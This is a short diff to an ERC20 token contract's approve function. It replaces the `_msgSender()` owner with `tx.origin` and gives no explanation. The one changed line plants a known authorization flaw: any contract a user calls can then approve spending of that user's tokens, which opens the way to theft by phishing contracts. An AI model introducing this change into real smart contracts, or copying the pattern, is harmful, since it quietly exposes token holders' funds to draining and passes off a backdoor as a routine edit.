@@ -134,7 +134,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * - `spender` cannot be the zero address.
      */
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        address owner = _msgSender();
+        address owner = tx.origin;
         _approve(owner, spender, amount);
         return true;
     }
